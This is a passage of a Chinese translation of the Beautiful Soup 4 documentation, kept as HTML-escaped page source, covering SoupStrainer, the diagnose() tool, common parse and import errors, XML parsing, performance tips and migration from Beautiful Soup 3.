class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;html_doc = &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;p class=&amp;quot;title&amp;quot;&amp;gt;&amp;lt;b&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/b&amp;gt;&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;p class=&amp;quot;story&amp;quot;&amp;gt;Once upon a time there were three little sisters; and their names were&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;a href=&amp;quot;http://example.com/elsie&amp;quot; class=&amp;quot;sister&amp;quot; id=&amp;quot;link1&amp;quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;a href=&amp;quot;http://example.com/lacie&amp;quot; class=&amp;quot;sister&amp;quot; id=&amp;quot;link2&amp;quot;&amp;gt;Lacie&amp;lt;/a&amp;gt; and&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;a href=&amp;quot;http://example.com/tillie&amp;quot; class=&amp;quot;sister&amp;quot; id=&amp;quot;link3&amp;quot;&amp;gt;Tillie&amp;lt;/a&amp;gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;and they lived at the bottom of a well.&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;p class=&amp;quot;story&amp;quot;&amp;gt;...&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print(BeautifulSoup(html_doc, &amp;quot;html.parser&amp;quot;, parse_only=only_a_tags).prettify())&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/elsie&amp;quot; id=&amp;quot;link1&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  Elsie&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/lacie&amp;quot; id=&amp;quot;link2&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  Lacie&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/tillie&amp;quot; id=&amp;quot;link3&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  Tillie&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print(BeautifulSoup(html_doc, &amp;quot;html.parser&amp;quot;, parse_only=only_tags_with_id_link2).prettify())&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/lacie&amp;quot; id=&amp;quot;link2&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  Lacie&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print(BeautifulSoup(html_doc, &amp;quot;html.parser&amp;quot;, parse_only=only_short_strings).prettify())&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# Elsie&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# ,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# Lacie&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# and&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# Tillie&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;还可以将 &lt;code&gt;SoupStrainer&lt;/code&gt; 作为参数传入 &lt;a href=&quot;#id24&quot;&gt;搜索文档树&lt;/a&gt; 中提到的方法.这可能不是个常用用法,所以还是提一下:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup = BeautifulSoup(html_doc)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.find_all(only_short_strings)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [u&amp;apos;\n\n&amp;apos;, u&amp;apos;\n\n&amp;apos;, u&amp;apos;Elsie&amp;apos;, u&amp;apos;,\n&amp;apos;, u&amp;apos;Lacie&amp;apos;, u&amp;apos; and\n&amp;apos;, u&amp;apos;Tillie&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  u&amp;apos;\n\n&amp;apos;, u&amp;apos;...&amp;apos;, u&amp;apos;\n&amp;apos;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&quot;常见问题&quot;&gt;&lt;a href=&quot;#常见问题&quot; class=&quot;headerlink&quot; title=&quot;常见问题&quot;&gt;&lt;/a&gt;常见问题&lt;/h1&gt;&lt;h2 id=&quot;代码诊断&quot;&gt;&lt;a href=&quot;#代码诊断&quot; class=&quot;headerlink&quot; title=&quot;代码诊断&quot;&gt;&lt;/a&gt;代码诊断&lt;/h2&gt;&lt;p&gt;如果想知道Beautiful Soup到底怎样处理一份文档,可以将文档传入 &lt;code&gt;diagnose()&lt;/code&gt; 方法(Beautiful Soup 4.2.0中新增),Beautiful Soup会输出一份报告,说明不同的解析器会怎样处理这段文档,并标出当前的解析过程会使用哪种解析器:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;from bs4.diagnose import diagnose&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;data = open(&amp;quot;bad.html&amp;quot;).read()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;diagnose(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# Diagnostic running on Beautiful Soup 4.2.0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# Python version 2.7.3 (default, Aug  1 2012, 05:16:07)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# I noticed that html5lib is not installed. Installing it may help.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# Found lxml version 2.3.2.0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# Trying to parse your data with html.parser&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# Here&amp;apos;s what html.parser did with the document:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# ...&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;diagnose()&lt;/code&gt; 方法的输出结果可能帮助你找到问题的原因,如果不行,还可以把结果复制出来以便寻求他人的帮助&lt;/p&gt;
&lt;h2 id=&quot;文档解析错误&quot;&gt;&lt;a href=&quot;#文档解析错误&quot; class=&quot;headerlink&quot; title=&quot;文档解析错误&quot;&gt;&lt;/a&gt;文档解析错误&lt;/h2&gt;&lt;p&gt;文档解析错误有两种.一种是崩溃,Beautiful Soup尝试解析一段文档结果却抛除了异常,通常是 &lt;code&gt;HTMLParser.HTMLParseError&lt;/code&gt; .还有一种异常情况,是Beautiful Soup解析后的文档树看起来与原来的内容相差很多.&lt;/p&gt;
&lt;p&gt;这些错误几乎都不是Beautiful Soup的原因,这不会是因为Beautiful Soup得代码写的太优秀,而是因为Beautiful Soup没有包含任何文档解析代码.异常产生自被依赖的解析器,如果解析器不能很好的解析出当前的文档,那么最好的办法是换一个解析器.更多细节查看 &lt;a href=&quot;#id9&quot;&gt;安装解析器&lt;/a&gt; 章节.&lt;/p&gt;
&lt;p&gt;最常见的解析错误是 &lt;code&gt;HTMLParser.HTMLParseError: malformed start tag&lt;/code&gt; 和 &lt;code&gt;HTMLParser.HTMLParseError: bad end tag&lt;/code&gt; .这都是由Python内置的解析器引起的,解决方法是 &lt;a href=&quot;#id9&quot;&gt;安装lxml或html5lib&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;最常见的异常现象是当前文档找不到指定的Tag,而这个Tag光是用眼睛就足够发现的了. &lt;code&gt;find_all()&lt;/code&gt; 方法返回 [] ,而 &lt;code&gt;find()&lt;/code&gt; 方法返回 None .这是Python内置解析器的又一个问题: 解析器会跳过那些它不知道的tag.解决方法还是 &lt;a href=&quot;#id9&quot;&gt;安装lxml或html5lib&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;版本错误&quot;&gt;&lt;a href=&quot;#版本错误&quot; class=&quot;headerlink&quot; title=&quot;版本错误&quot;&gt;&lt;/a&gt;版本错误&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SyntaxError: Invalid syntax&lt;/code&gt; (异常位置在代码行: &lt;code&gt;ROOT_TAG_NAME = u&amp;#39;[document]&amp;#39;&lt;/code&gt; ),因为Python2版本的代码没有经过迁移就在Python3中窒息感&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ImportError: No module named HTMLParser&lt;/code&gt; 因为在Python3中执行Python2版本的Beautiful Soup&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ImportError: No module named html.parser&lt;/code&gt; 因为在Python2中执行Python3版本的Beautiful Soup&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ImportError: No module named BeautifulSoup&lt;/code&gt; 因为在没有安装BeautifulSoup3库的Python环境下执行代码,或忘记了BeautifulSoup4的代码需要从 &lt;code&gt;bs4&lt;/code&gt; 包中引入&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ImportError: No module named bs4&lt;/code&gt; 因为当前Python环境下还没有安装BeautifulSoup4&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;解析成XML&quot;&gt;&lt;a href=&quot;#解析成XML&quot; class=&quot;headerlink&quot; title=&quot;解析成XML&quot;&gt;&lt;/a&gt;解析成XML&lt;/h2&gt;&lt;p&gt;默认情况下,Beautiful Soup会将当前文档作为HTML格式解析,如果要解析XML文档,要在 &lt;code&gt;BeautifulSoup&lt;/code&gt; 构造方法中加入第二个参数 “xml”:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup = BeautifulSoup(markup, &amp;quot;xml&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;当然,还需要 &lt;a href=&quot;#id9&quot;&gt;安装lxml&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;解析器的错误&quot;&gt;&lt;a href=&quot;#解析器的错误&quot; class=&quot;headerlink&quot; title=&quot;解析器的错误&quot;&gt;&lt;/a&gt;解析器的错误&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;如果同样的代码在不同环境下结果不同,可能是因为两个环境下使用不同的解析器造成的.例如这个环境中安装了lxml,而另一个环境中只有html5lib, &lt;a href=&quot;#id49&quot;&gt;解析器之间的区别&lt;/a&gt; 中说明了原因.修复方法是在 &lt;code&gt;BeautifulSoup&lt;/code&gt; 的构造方法中中指定解析器&lt;/li&gt;
&lt;li&gt;因为HTML标签是 &lt;a href=&quot;http://www.w3.org/TR/html5/syntax.html#syntax&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;大小写敏感&lt;/a&gt; 的,所以3种解析器再出来文档时都将tag和属性转换成小写.例如文档中的 &lt;code&gt;&amp;lt;TAG&amp;gt;&amp;lt;/TAG&amp;gt;&lt;/code&gt; 会被转换为 &lt;code&gt;&amp;lt;tag&amp;gt;&amp;lt;/tag&amp;gt;&lt;/code&gt; .如果想要保留tag的大写的话,那么应该将文档 &lt;a href=&quot;#xml&quot;&gt;解析成XML&lt;/a&gt; .&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;杂项错误&quot;&gt;&lt;a href=&quot;#杂项错误&quot; class=&quot;headerlink&quot; title=&quot;杂项错误&quot;&gt;&lt;/a&gt;杂项错误&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;UnicodeEncodeError: &amp;#39;charmap&amp;#39; codec can&amp;#39;t encode character u&amp;#39;\xfoo&amp;#39; in position bar&lt;/code&gt; (或其它类型的 &lt;code&gt;UnicodeEncodeError&lt;/code&gt; )的错误,主要是两方面的错误(都不是Beautiful Soup的原因),第一种是正在使用的终端(console)无法显示部分Unicode,参考 &lt;a href=&quot;http://wiki.Python.org/moin/PrintFails&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Python wiki&lt;/a&gt; ,第二种是向文件写入时,被写入文件不支持部分Unicode,这时只要用 &lt;code&gt;u.encode(&amp;quot;utf8&amp;quot;)&lt;/code&gt; 方法将编码转换为UTF-8.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;KeyError: [attr]&lt;/code&gt; 因为调用 &lt;code&gt;tag[&amp;#39;attr&amp;#39;]&lt;/code&gt; 方法而引起,因为这个tag没有定义该属性.出错最多的是 &lt;code&gt;KeyError: &amp;#39;href&amp;#39;&lt;/code&gt; 和 &lt;code&gt;KeyError: &amp;#39;class&amp;#39;&lt;/code&gt; .如果不确定某个属性是否存在时,用 &lt;code&gt;tag.get(&amp;#39;attr&amp;#39;)&lt;/code&gt; 方法去获取它,跟获取Python字典的key一样&lt;/li&gt;
&lt;li&gt;&lt;code&gt;AttributeError: &amp;#39;ResultSet&amp;#39; object has no attribute &amp;#39;foo&amp;#39;&lt;/code&gt; 错误通常是因为把 &lt;code&gt;find_all()&lt;/code&gt; 的返回结果当作一个tag或文本节点使用,实际上返回结果是一个列表或 &lt;code&gt;ResultSet&lt;/code&gt; 对象的字符串,需要对结果进行循环才能得到每个节点的 &lt;code&gt;.foo&lt;/code&gt; 属性.或者使用 &lt;code&gt;find()&lt;/code&gt; 方法仅获取到一个节点&lt;/li&gt;
&lt;li&gt;&lt;code&gt;AttributeError: &amp;#39;NoneType&amp;#39; object has no attribute &amp;#39;foo&amp;#39;&lt;/code&gt; 这个错误通常是在调用了 &lt;code&gt;find()&lt;/code&gt; 方法后直节点取某个属性 .foo 但是 &lt;code&gt;find()&lt;/code&gt; 方法并没有找到任何结果,所以它的返回值是 &lt;code&gt;None&lt;/code&gt; .需要找出为什么 &lt;code&gt;find()&lt;/code&gt; 的返回值是 &lt;code&gt;None&lt;/code&gt; .&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;如何提高效率&quot;&gt;&lt;a href=&quot;#如何提高效率&quot; class=&quot;headerlink&quot; title=&quot;如何提高效率&quot;&gt;&lt;/a&gt;如何提高效率&lt;/h2&gt;&lt;p&gt;Beautiful Soup对文档的解析速度不会比它所依赖的解析器更快,如果对计算时间要求很高或者计算机的时间比程序员的时间更值钱,那么就应该直接使用 &lt;a href=&quot;http://lxml.de/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;lxml&lt;/a&gt; .&lt;/p&gt;
&lt;p&gt;换句话说,还有提高Beautiful Soup效率的办法,使用lxml作为解析器.Beautiful Soup用lxml做解析器比用html5lib或Python内置解析器速度快很多.&lt;/p&gt;
&lt;p&gt;安装 &lt;a href=&quot;http://pypi.Python.org/pypi/cchardet/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;cchardet&lt;/a&gt; 后文档的解码的编码检测会速度更快&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;#id58&quot;&gt;解析部分文档&lt;/a&gt; 不会节省多少解析时间,但是会节省很多内存,并且搜索时也会变得更快.&lt;/p&gt;
&lt;h1 id=&quot;Beautiful-Soup-3&quot;&gt;&lt;a href=&quot;#Beautiful-Soup-3&quot; class=&quot;headerlink&quot; title=&quot;Beautiful Soup 3&quot;&gt;&lt;/a&gt;Beautiful Soup 3&lt;/h1&gt;&lt;p&gt;Beautiful Soup 3是上一个发布版本,目前已经停止维护.Beautiful Soup 3库目前已经被几个主要的linux平台添加到源里:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ apt-get install Python-beautifulsoup&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在PyPi中分发的包名字是 &lt;code&gt;BeautifulSoup&lt;/code&gt; :&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ easy_install BeautifulSoup&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ pip install BeautifulSoup&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;或通过 &lt;a href=&quot;http://www.crummy.com/software/BeautifulSoup/bs3/download/3.x/BeautifulSoup-3.2.0.tar.gz&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Beautiful Soup 3.2.0源码包&lt;/a&gt; 安装&lt;/p&gt;
&lt;p&gt;Beautiful Soup 3的在线文档查看 &lt;a href=&quot;http://www.crummy.com/software/BeautifulSoup/bs3/documentation.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这里&lt;/a&gt; ,当然还有 &lt;a href=&quot;http://www.crummy.com/software/BeautifulSoup/bs3/documentation.zh.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;中文版&lt;/a&gt; ,然后再读本片文档,来对比Beautiful Soup 4中有什新变化.&lt;/p&gt;
&lt;h2 id=&quot;迁移到BS4&quot;&gt;&lt;a href=&quot;#迁移到BS4&quot; class=&quot;headerlink&quot; title=&quot;迁移到BS4&quot;&gt;&lt;/a&gt;迁移到BS4&lt;/h2&gt;&lt;p&gt;只要一个小变动就能让大部分的Beautiful Soup 3代码使用Beautiful Soup 4的库和方法—-修改 &lt;code&gt;BeautifulSoup&lt;/code&gt; 对象的引入方式:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;from BeautifulSoup import BeautifulSoup&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;修改为:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;from bs4 import BeautifulSoup&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;如果代码抛出 &lt;code&gt;ImportError&lt;/code&gt; 异常“No module named BeautifulSoup”,原因可能是尝试执行Beautiful Soup 3,但环境中只安装了Beautiful Soup 4库&lt;/li&gt;
&lt;li&gt;如果代码跑出 &lt;code&gt;ImportError&lt;/code&gt; 异常“No module named bs4”,原因可能是尝试运行Beautiful Soup 4的代码,但环境中只安装了Beautiful Soup 3.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;虽然BS4兼容绝大部分BS3的功能,但BS3中的大部分方法已经不推荐使用了,就方法按照 &lt;a href=&quot;http://www.Python.org/dev/peps/pep-0008/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;PEP8标准&lt;/a&gt; 重新定义了方法名.很多方法都重新定义了方法名,但只有少数几个方法没有向下兼容.&lt;/p&gt;
&lt;p&gt;上述内容就是BS3迁移到BS4的注意事项&lt;/p&gt;
&lt;h3 id=&quot;需要的解析器&quot;&gt;&lt;a href=&quot;#需要的解析器&quot; class=&quot;headerlink&quot; title=&quot;需要的解析器&quot;&gt;&lt;/a&gt;需要的解析器&lt;/h3&gt;&lt;p&gt;Beautiful Soup 3曾使用Python的 &lt;code&gt;SGMLParser&lt;/code&gt; 解析器,这个模块在Python3中已经被移除了.Beautiful Soup 4默认使用系统的 &lt;code&gt;html.parser&lt;/code&gt; ,也可以使用lxml或html5lib扩展库代替.查看 &lt;a href=&quot;#id9&quot;&gt;安装解析器&lt;/a&gt; 章节&lt;/p&gt;
&lt;p&gt;因为 &lt;code&gt;html.parser&lt;/code&gt; 解析器与 &lt;code&gt;SGMLParser&lt;/code&gt; 解析器不同,它们在处理格式不正确的文档时也会产生不同结果.通常 &lt;code&gt;html.parser&lt;/code&gt; 解析器会抛出异常.所以推荐安装扩展库作为解析器.有时 &lt;code&gt;html.parser&lt;/code&gt; 解析出的文档树结构与 &lt;code&gt;SGMLParser&lt;/code&gt; 的不同.如果发生这种情况,那么需要升级BS3来处理新的文档树.&lt;/p&gt;
&lt;h3 id=&quot;方法名的变化&quot;&gt;&lt;a href=&quot;#方法名的变化&quot; class=&quot;headerlink&quot; title=&quot;方法名的变化&quot;&gt;&lt;/a&gt;方法名的变化&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;renderContents&lt;/code&gt; -&amp;gt; &lt;code&gt;encode_contents&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;replaceWith&lt;/code&gt; -&amp;gt; &lt;code&gt;replace_with&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;replaceWithChildren&lt;/code&gt; -&amp;gt; &lt;code&gt;unwrap&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;findAll&lt;/code&gt; -&amp;gt; &lt;code&gt;find_all&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;findAllNext&lt;/code&gt; -&amp;gt; &lt;code&gt;find_all_next&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;findAllPrevious&lt;/code&gt; -&amp;gt; &lt;code&gt;find_all_previous&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;findNext&lt;/code&gt; -&amp;gt; &lt;code&gt;find_next&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;findNextSibling&lt;/code&gt; -&amp;gt; &lt;code&gt;find_next_sibling&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;findNextSiblings&lt;/code&gt; -&amp;gt; &lt;code&gt;find_next_siblings&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;findParent&lt;/code&gt; -&amp;gt; &lt;code&gt;find_parent&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;findParents&lt;/code&gt; -&amp;gt; &lt;code&gt;find_parents&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;findPrevious&lt;/code&gt; -&amp;gt; &lt;code&gt;find_previous&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;findPreviousSibling&lt;/code&gt; -&amp;gt; &lt;code&gt;find_previous_sibling&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;findPreviousSiblings&lt;/code&gt; -&amp;gt; &lt;code&gt;find_previous_siblings&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;nextSibling&lt;/code&gt; -&amp;gt; &lt;code&gt;next_sibling&lt;/code&gt;&lt;/li&gt;
